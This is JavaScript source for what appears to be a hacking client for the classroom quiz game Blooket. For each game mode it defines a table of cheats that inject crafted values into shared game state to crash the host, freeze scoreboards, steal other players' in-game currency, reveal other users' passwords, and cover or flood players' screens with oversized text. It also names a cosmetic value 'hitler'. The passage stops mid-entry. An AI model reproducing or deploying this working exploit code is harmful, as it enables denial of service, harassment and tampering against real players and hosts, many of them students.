
const _k = [66,49,48,48,107,51,116,70,108,48,48,100,51,114,75,51,121,50,48,50,54,83,101,99,117,114,101,65,69,83,33,33];
const AES_GCM_IV_LENGTH = 12;

const CryptoModule = {
  encoder: new TextEncoder(),
  decoder: new TextDecoder(),
  
  async getKey() {
    if (this._key) return this._key;
    const keyData = new Uint8Array(_k);
    this._key = await crypto.subtle.importKey(
      "raw",
      keyData,
      { name: "AES-GCM" },
      false,
      ["encrypt", "decrypt"]
    );
    return this._key;
  },
  
  generateIV() {
    return crypto.getRandomValues(new Uint8Array(AES_GCM_IV_LENGTH));
  },
  
  async encrypt(plaintext) {
    const key = await this.getKey();
    const iv = this.generateIV();
    const encoded = this.encoder.encode(plaintext);
    
    const ciphertext = await crypto.subtle.encrypt(
      { name: "AES-GCM", iv: iv },
      key,
      encoded
    );
    
    const combined = new Uint8Array(iv.length + ciphertext.byteLength);
    combined.set(iv);
    combined.set(new Uint8Array(ciphertext), iv.length);
    
    return btoa(String.fromCharCode(...combined));
  },
  
  async decrypt(encryptedBase64) {
    const key = await this.getKey();
    const combined = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));
    
    const iv = combined.slice(0, AES_GCM_IV_LENGTH);
    const ciphertext = combined.slice(AES_GCM_IV_LENGTH);
    
    const decrypted = await crypto.subtle.decrypt(
      { name: "AES-GCM", iv: iv },
      key,
      ciphertext
    );
    
    return this.decoder.decode(decrypted);
  },
  
  async encryptObject(obj) {
    const json = JSON.stringify(obj);
    return await this.encrypt(json);
  },
  
  async decryptObject(encryptedBase64) {
    const json = await this.decrypt(encryptedBase64);
    return JSON.parse(json);
  }
};

async function encryptedFetch(url, options = {}) {
  const isPost = options.method === "POST";
  
  if (isPost && options.body) {
    const bodyData = typeof options.body === "string" ? options.body : JSON.stringify(options.body);
    const encryptedBody = await CryptoModule.encrypt(bodyData);
    options.body = JSON.stringify({ encrypted: true, data: encryptedBody });
    options.headers = {
      ...options.headers,
      "Content-Type": "application/json",
      "X-Encrypted": "AES-GCM-256"
    };
  }
  
  const response = await fetch(url, options);
  const responseText = await response.text();
  
  try {
    const responseJson = JSON.parse(responseText);
    if (responseJson.encrypted && responseJson.data) {
      const decryptedData = await CryptoModule.decryptObject(responseJson.data);
      return { 
        ok: response.ok, 
        status: response.status,
        json: async () => decryptedData,
        text: async () => JSON.stringify(decryptedData)
      };
    }
    return { 
      ok: response.ok, 
      status: response.status,
      json: async () => responseJson,
      text: async () => responseText
    };
  } catch {
    return { 
      ok: response.ok, 
      status: response.status,
      json: async () => JSON.parse(responseText),
      text: async () => responseText
    };
  }
}

const SecureStorage = {
  async set(key, value) {
    const encrypted = await CryptoModule.encryptObject(value);
    localStorage.setItem(`enc_${key}`, encrypted);
  },
  
  async get(key) {
    const encrypted = localStorage.getItem(`enc_${key}`);
    if (!encrypted) return null;
    try {
      return await CryptoModule.decryptObject(encrypted);
    } catch {
      return null;
    }
  },
  
  remove(key) {
    localStorage.removeItem(`enc_${key}`);
  }
};

const SecureWebSocket = {
  async createSecureMessage(data) {
    return await CryptoModule.encryptObject(data);
  },
  
  async parseSecureMessage(encryptedData) {
    return await CryptoModule.decryptObject(encryptedData);
  }
};

const hitler = "1#0#1#0#1$3#0#0#1#6#0#0$0";
var blooks = [
  "Chick",
  "Chicken",
  "Cow",
  "Goat",
  "Horse",
  "Pig",
  "Sheep",
  "Duck",
  "Alpaca",
  "Dog",
  "Cat",
  "Rabbit",
  "Goldfish",
  "Hamster",
  "Turtle",
  "Kitten",
  "Puppy",
  "Bear",
  "Moose",
  "Fox",
  "Raccoon",
  "Squirrel",
  "Owl",
  "Hedgehog",
  "Deer",
  "Wolf",
  "Beaver",
  "Tiger",
  "Orangutan",
  "Cockatoo",
  "Parrot",
  "Anaconda",
  "Jaguar",
  "Macaw",
  "Toucan",
  "Panther",
  "Capuchin",
  "Gorilla",
  "Hippo",
  "Rhino",
  "Giraffe",
  "Snowy Owl",
  "Polar Bear",
  "Arctic Fox",
  "Baby Penguin",
  "Penguin",
  "Arctic Hare",
  "Seal",
  "Walrus",
  "Witch",
  "Wizard",
  "Elf",
  "Fairy",
  "Slime Monster",
  "Jester",
  "Dragon",
  "Queen",
  "Unicorn",
  "King",
  "Two of Spades",
  "Eat Me",
  "Drink Me",
  "Alice",
  "Queen of Hearts",
  "Dormouse",
  "White Rabbit",
  "Cheshire Cat",
  "Caterpillar",
  "Mad Hatter",
  "King of Hearts",
  "Toast",
  "Cereal",
  "Yogurt",
  "Breakfast Combo",
  "Orange Juice",
  "Milk",
  "Waffle",
  "Pancakes",
  "French Toast",
  "Pizza",
  "Earth",
  "Meteor",
  "Stars",
  "Alien",
  "Planet",
  "UFO",
  "Spaceship",
  "Astronaut",
  "Lil Bot",
  "Lovely Bot",
  "Angry Bot",
  "Happy Bot",
  "Watson",
  "Buddy Bot",
  "Brainy Bot",
  "Mega Bot",
  "Old Boot",
  "Jellyfish",
  "Clownfish",
  "Frog",
  "Crab",
  "Pufferfish",
  "Blobfish",
  "Octopus",
  "Narwhal",
  "Dolphin",
  "Baby Shark",
  "Megalodon",
  "Panda",
  "Sloth",
  "Tenrec",
  "Flamingo",
  "Zebra",
  "Elephant",
  "Lemur",
  "Peacock",
  "Chameleon",
  "Lion",
  "Amber",
  "Dino Egg",
  "Dino Fossil",
  "Stegosaurus",
  "Velociraptor",
  "Brontosaurus",
  "Triceratops",
  "Tyrannosaurus Rex",
  "Ice Bat",
  "Ice Bug",
  "Ice Elemental",
  "Rock Monster",
  "Dink",
  "Donk",
  "Bush Monster",
  "Yeti",
  "Dingo",
  "Echidna",
  "Koala",
  "Kookaburra",
  "Platypus",
  "Joey",
  "Kangaroo",
  "Crocodile",
  "Sugar Glider",
  "Deckhand",
  "Buccaneer",
  "Swashbuckler",
  "Treasure Map",
  "Seagull",
  "Jolly Pirate",
  "Pirate Ship",
  "Kraken",
  "Captain Blackbeard",
  "Snow Globe",
  "Holiday Gift",
  "Hot Chocolate",
  "Holiday Wreath",
  "Stocking",
  "Gingerbread Man",
  "Gingerbread House",
  "Reindeer",
  "Snowman",
  "Santa Claus",
  "Pumpkin",
  "Swamp Monster",
  "Frankenstein",
  "Vampire",
  "Zombie",
  "Mummy",
  "Caramel Apple",
  "Candy Corn",
  "Werewolf",
  "Ghost",
  "Rainbow Jellyfish",
  "Blizzard Clownfish",
  "Lovely Frog",
  "Lucky Frog",
  "Spring Frog",
  "Poison Dart Frog",
  "Lucky Hamster",
  "Chocolate Rabbit",
  "Spring Rabbit",
  "Lemon Crab",
  "Pirate Pufferfish",
  "Donut Blobfish",
  "Crimson Octopus",
  "Rainbow Narwhal",
  "Frost Wreath",
  "Tropical Globe",
  "New York Snow Globe",
  "London Snow Globe",
  "Japan Snow Globe",
  "Egypt Snow Globe",
  "Paris Snow Globe",
  "Red Sweater Snowman",
  "Blue Sweater Snowman",
  "Elf Sweater Snowman",
  "Santa Claws",
  "Cookies Combo",
  "Chilly Flamingo",
  "Snowy Bush Monster",
  "Nutcracker Koala",
  "Sandwich",
  "Ice Slime",
  "Frozen Fossil",
  "Ice Crab",
  "Rainbow Panda",
  "White Peacock",
  "Tiger Zebra",
  "Teal Platypus",
  "Red Astronaut",
  "Orange Astronaut",
  "Yellow Astronaut",
  "Lime Astronaut",
  "Green Astronaut",
  "Cyan Astronaut",
  "Blue Astronaut",
  "Pink Astronaut",
  "Purple Astronaut",
  "Brown Astronaut",
  "Black Astronaut",
  "Lovely Planet",
  "Lovely Peacock",
  "Haunted Pumpkin",
  "Pumpkin Cookie",
  "Ghost Cookie",
  "Red Gummy Bear",
  "Blue Gummy Bear",
  "Green Gummy Bear",
  "Chick Chicken",
  "Chicken Chick",
  "Raccoon Bandit",
  "Owl Sheriff",
  "Vampire Frog",
  "Pumpkin King",
  "Leprechaun",
  "Anaconda Wizard",
  "Spooky Pumpkin",
  "Spooky Mummy",
  "Agent Owl",
  "Master Elf",
  "Party Pig",
  "Wise Owl",
  "Spooky Ghost",
  "Phantom King",
  "Tim the Alien",
  "Rainbow Astronaut",
  "Hamsta Claus",
  "Light Blue",
  "Black",
  "Red",
  "Purple",
  "Pink",
  "Orange",
  "Lime",
  "Green",
  "Teal",
  "Tan",
  "Maroon",
  "Gray",
  "Mint",
  "Salmon",
  "Burgandy",
  "Baby Blue",
  "Dust",
  "Brown",
  "Dull Blue",
  "Yellow",
  "Blue",
  hitler,
];
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
var fblooks = [
  "Chick",
  "Chicken",
  "Cow",
  "Goat",
  "Horse",
  "Pig",
  "Sheep",
  "Duck",
  "Alpaca",
  "Dog",
  "Cat",
  "Rabbit",
  "Goldfish",
  "Hamster",
  "Turtle",
  "Kitten",
  "Puppy",
  "Bear",
  "Moose",
  "Fox",
  "Raccoon",
  "Squirrel",
  "Owl",
  "Hedgehog",
  "Deer",
  "Wolf",
  "Beaver",
  "Tiger",
  "Orangutan",
  "Cockatoo",
  "Parrot",
  "Anaconda",
  "Jaguar",
  "Macaw",
  "Toucan",
  "Panther",
  "Capuchin",
];
var botinfo = {};
var allBots = []; 
let canJoin = true;
var gameobject = {};
var tokens = [];
var oname;
var unreads = 0;
var chosenBlook = "random"; 
var lastGameStage = null; 
var blookEnforcerInterval = null;
var playerSelectElements = [];
var playerListUpdateInterval = null;
var lastPlayerListHash = ""; 


function startBlookEnforcer() {
  stopBlookEnforcer(); 
  if (chosenBlook && chosenBlook !== "random") {
    blookEnforcerInterval = setInterval(() => {
      if (allBots.length > 0 && botinfo.connected) {
        var blookVal = chosenBlook === "hitler" ? hitler : chosenBlook;
        setUserVal("b", blookVal);
      }
    }, 500);
  }
}

function stopBlookEnforcer() {
  if (blookEnforcerInterval) {
    clearInterval(blookEnforcerInterval);
    blookEnforcerInterval = null;
  }
}

function startPlayerListUpdater() {
  stopPlayerListUpdater();
  playerListUpdateInterval = setInterval(() => {
    updateAllPlayerSelects();
  }, 1000);
}

function stopPlayerListUpdater() {
  if (playerListUpdateInterval) {
    clearInterval(playerListUpdateInterval);
    playerListUpdateInterval = null;
  }
}

function updateAllPlayerSelects() {
  if (!gameobject || !gameobject.c) return;
  
  var players = Object.keys(gameobject.c).sort();
  var currentHash = players.join(",");
  
  if (currentHash === lastPlayerListHash) return;
  lastPlayerListHash = currentHash;
  
  playerSelectElements = playerSelectElements.filter(el => document.body.contains(el));
  
  playerSelectElements.forEach(selectEl => {
    var currentValue = selectEl.value;
    selectEl.innerHTML = "";
    players.forEach(playerName => {
      var opt = document.createElement("option");
      opt.innerText = playerName;
      opt.value = playerName;
      selectEl.appendChild(opt);
    });
    if (players.includes(currentValue)) {
      selectEl.value = currentValue;
    }
  });
}

var fvals = {
  Hack: "cr",
  Gold: "g",
  Candy: "g",
  Defense2: "d",
  Defense: "d",
  Pirate: "d",
  Fish: "w",
  Brawl: "xp",
  Factory: "ca",
  Dino: "f",
  Cafe: "ca",
  Rush: "d",
  Royale: "d",
  Classic: "d",
  Racing: "d",
  Toy: "t",
};

var gameModeMap = {
  "Crypto Hack": "Hack",
  "Gold Quest": "Gold",
  "Candy Quest": "Candy",
  "Tower Defense": "Defense",
  "Tower Defense 2": "Defense2",
  "Fishing Frenzy": "Fish",
  "Crazy Kingdom": "Pirate",
  "Deceptive Dinos": "Dino",
  "Cafe": "Cafe",
  "Blook Rush": "Rush",
  "Battle Royale": "Royale",
  "Classic": "Classic",
  "Racing": "Racing",
  "Monster Brawl": "Brawl",
  "Factory": "Factory",
  "Santa's Workshop": "Toy",
};

var cheats = {
  Hack: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("cr/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "button",
      name: "Turn Host Screen Green",
      action: function (a) {
        if (a.green != undefined) {
          a.green = !a.green;
        } else {
          a.green = true;
        }
        if (a.green) {
          setUserVal(
            "cr",
            (function () {
              var t =
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
              for (var i = 0; i < 300000; i++) {
                t += String.fromCharCode(3655);
                if (i % 61 === 0) {
                  t += String.fromCharCode(32);
                }
              }
              t +=
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
              return t;
            })()
          );
        } else {
          setUserVal("cr", 0);
        }
        a.innerText = a.green
          ? "Ungreen Host Screen"
          : "Turn Host Screen Green";
      },
    },
    {
      type: "button",
      name: "Set Crash Password",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("p/toString", "t");
        } else {
          setUserVal("p", "DogLover3");
        }
        a.innerText = a.frozen ? "Remove Crash Password" : "Set Crash Password";
      },
    },
    {
      type: "button",
      name: "Set Freeze Password",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("p", genCursed());
        } else {
          setUserVal("p", "DogLover3");
        }
        a.innerText = a.frozen
          ? "Remove Freeze Password"
          : "Set Freeze Password";
      },
    },
    {
      type: "input",
      name: "Set Crypto",
      action: function (amt) {
        setUserVal("cr", amt);
      },
    },
    {
      type: "input",
      name: "Set Password",
      action: function (val) {
        setUserVal("p", val);
      },
    },
    {
      type: "select",
      name: "Get User Password",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        alert(gameobject?.c?.[d]?.p);
      },
    },
    {
      type: "select",
      name: "Steal Crypto From",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("How much crypto do you want to steal?")}`
        );
      },
    },
    {
      type: "input",
      name: "Cover Host's Screen",
      action: function (adtext) {
        setUserVal(
          "cr",
          (function () {
            var r = new Array(100).fill("1").join("");
            for (var i = 0; i < 500; i++) {
              r += adtext;
              if (i % 10 === 0) {
                r += "\n\r";
              } else {
                r += " ";
              }
            }
            return r;
          })()
        );
      },
    },
    {
      type: "select",
      name: "Cover Player's Screen",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        var adtext = prompt(
          "Enter the text to cover their screen with:"
        );
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Parrot:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          setTimeout(() => {
            setUserVal("tat", `${d}:100`);
            setTimeout(() => {
              startBlookEnforcer();
            }, 1000);
          }, 1000);
        }
      },
    },
    {
      type: "input",
      name: "Cover All Screens",
      action: function (adtext) {
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          var players = Object.keys(gameobject.c).filter(p => p !== botinfo.name);
          if (players.length === 0) {
            alert("No other players to cover!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Parrot:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          var i = 0;
          var sendNext = () => {
            if (i < players.length) {
              setUserVal("tat", `${players[i]}:100`);
              i++;
              setTimeout(sendNext, 200);
            } else {
              setTimeout(() => {
                startBlookEnforcer();
              }, 1000);
            }
          };
          setTimeout(sendNext, 500);
        }
      },
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "tat",
          `${botinfo.name}:${Date.now()}${new Array(1700)
            .fill(stext + " ")
            .join("")}`
        );
      },
    },
  ],
  Gold: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("g/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "select",
      name: "Steal Gold From",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("How much gold do you want to steal?")}`
        );
      },
    },
    {
      type: "select",
      name: "Set Player's Gold",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:swap:${prompt("What do you want to set it to?")}`
        );
      },
    },
    {
      type: "input",
      name: "Set Gold",
      action: function (amt) {
        setUserVal("g", amt);
      },
    },
    {
      type: "select",
      name: "Cover Player's Screen",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        var adtext = prompt(
          "Enter the text to cover their screen with:"
        );
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Dog:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          setTimeout(() => {
            setUserVal("tat", `${d}:100`);
            setTimeout(() => {
              startBlookEnforcer();
            }, 1000);
          }, 1000);
        }
      },
    },
    {
      type: "input",
      name: "Cover All Screens",
      action: function (adtext) {
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          var players = Object.keys(gameobject.c).filter(p => p !== botinfo.name);
          if (players.length === 0) {
            alert("No other players to cover!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Dog:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          var i = 0;
          var sendNext = () => {
            if (i < players.length) {
              setUserVal("tat", `${players[i]}:100`);
              i++;
              setTimeout(sendNext, 200);
            } else {
              setTimeout(() => {
                startBlookEnforcer();
              }, 1000);
            }
          };
          setTimeout(sendNext, 500);
        }
      },
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "tat",
          `${botinfo.name}:${Date.now()}${new Array(1700)
            .fill(stext + " ")
            .join("")}`
        );
      },
    },
  ],
  Candy: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("g/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "select",
      name: "Steal Candy From",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("How much candy do you want to steal?")}`
        );
      },
    },
    {
      type: "select",
      name: "Set Player's Candy",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:swap:${prompt("What do you want to set it to?")}`
        );
      },
    },
    {
      type: "input",
      name: "Set Candy",
      action: function (amt) {
        setUserVal("g", amt);
      },
    },
    {
      type: "select",
      name: "Cover Player's Screen",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        var adtext = prompt(
          "Enter the text to cover their screen with:"
        );
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Dog:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          setTimeout(() => {
            setUserVal("tat", `${d}:100`);
            setTimeout(() => {
              startBlookEnforcer();
            }, 1000);
          }, 1000);
        }
      },
    },
    {
      type: "input",
      name: "Cover All Screens",
      action: function (adtext) {
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          var players = Object.keys(gameobject.c).filter(p => p !== botinfo.name);
          if (players.length === 0) {
            alert("No other players to cover!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Dog:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          var i = 0;
          var sendNext = () => {
            if (i < players.length) {
              setUserVal("tat", `${players[i]}:100`);
              i++;
              setTimeout(sendNext, 200);
            } else {
              setTimeout(() => {
                startBlookEnforcer();
              }, 1000);
            }
          };
          setTimeout(sendNext, 500);
        }
      },
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "tat",
          `${botinfo.name}:${Date.now()}${new Array(1700)
            .fill(stext + " ")
            .join("")}`
        );
      },
    },
  ],
  Defense2: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("d/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("r/toString", "t");
        } else {
          setUserVal("r", 1);
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Set Damage",
      action: function (amt) {
        setUserVal("d", amt);
      },
    },
    {
      type: "input",
      name: "Set Round",
      action: function (round) {
        setUserVal("r", round);
      },
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "r",
          `${Date.now()}${new Array(1700).fill(stext + " ").join("")}`
        );
      },
    },
  ],
  Defense: [
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("d/toString", "t");
        } else {
          setUserVal("d", 0);
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Set Damage",
      action: function (amt) {
        setUserVal("d", amt);
      },
    },
  ],
  Fish: [
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("f/t", "t");
        } else {
          setUserVal("f", "Old Boot");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "button",
      name: "Activate Frenzy",
      action: function (d) {
        setUserVal("s", true);
        setUserVal("f", "Frenzy");
      },
    },
    {
      type: "input",
      name: "Set Weight",
      action: function (amt) {
        setUserVal("w", amt);
      },
    },
    {
      type: "input",
      name: "Set Caught Fish",
      action: function (fish) {
        setUserVal("f", fish);
      },
    },
    {
      type: "input",
      name: "Send Distraction",
      action: function (d) {
        setUserVal("s", true);
        setUserVal("f", d);
      },
    },
  ],
  Pirate: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("d/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "select",
      name: "Steal Doubloons From",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("How many doubloons do you want to steal?")}`
        );
      },
    },
    {
      type: "input",
      name: "Set Doubloons",
      action: function (d) {
        setUserVal("d", d);
      },
    },
    {
      type: "select",
      name: "Cover Player's Screen",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        var adtext = prompt(
          "Enter the text to cover their screen with:"
        );
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Parrot:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          setTimeout(() => {
            setUserVal("tat", `${d}:100`);
            setTimeout(() => {
              startBlookEnforcer();
            }, 1000);
          }, 1000);
        }
      },
    },
    {
      type: "input",
      name: "Cover All Screens",
      action: function (adtext) {
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          var players = Object.keys(gameobject.c).filter(p => p !== botinfo.name);
          if (players.length === 0) {
            alert("No other players to cover!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Parrot:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          var i = 0;
          var sendNext = () => {
            if (i < players.length) {
              setUserVal("tat", `${players[i]}:100`);
              i++;
              setTimeout(sendNext, 200);
            } else {
              setTimeout(() => {
                startBlookEnforcer();
              }, 1000);
            }
          };
          setTimeout(sendNext, 500);
        }
      },
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "tat",
          `${botinfo.name}:${Date.now()}${new Array(1700)
            .fill(stext + " ")
            .join("")}`
        );
      },
    },
  ],
  Dino: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("f/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Set Fossils",
      action: function (d) {
        setUserVal("f", d);
      },
    },
    {
      type: "staticsel",
      name: "Set Cheating",
      values: ["true", "false"],
      action: function (d) {
        setUserVal("ic", d);
      },
    },
    {
      type: "select",
      name: "Catch Player Cheating",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal("tat", `${d}:true`);
      },
    },
  ],
  Cafe: [
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Set Cash",
      action: function (d) {
        setUserVal("ca", d);
      },
    },
    {
      type: "input",
      name: "Set Upgrade(ex. Cereal:1)",
      action: function (d) {
        setUserVal("up", d);
      },
    },
    {
      type: "select",
      name: "Attack player",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("What attack do you want(inspect, pay, etc)?")}`
        );
      },
    },
        {
      type: "select",
      name: "Spam Attack Player",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: async function (d) {
        var spamTimes = parseInt(prompt("How many times to spam?")) || 1;
        var attToSpam = prompt("What attack do you want (inspect, pay, etc)?");
        for (let i = 0; i < spamTimes; i++) {
          setUserVal("tat", `${d}:${attToSpam}`);
          await new Promise(r => setTimeout(r, 500));
        }
      }
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "up",
          `a:${Date.now()}${new Array(1700).fill(stext + " ").join("")}`
        );
      },
    },
  ],
  Brawl: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("xp/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("up/t", "t");
        } else {
          setUserVal("up", "Dark Energy:2");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Set XP",
      action: function (a) {
        setUserVal("xp", a);
      },
    },
    {
      type: "input",
      name: "Set Upgrade(upgrade:level)",
      action: function (a) {
        setUserVal("up", a);
      },
    },
    {
      type: "input",
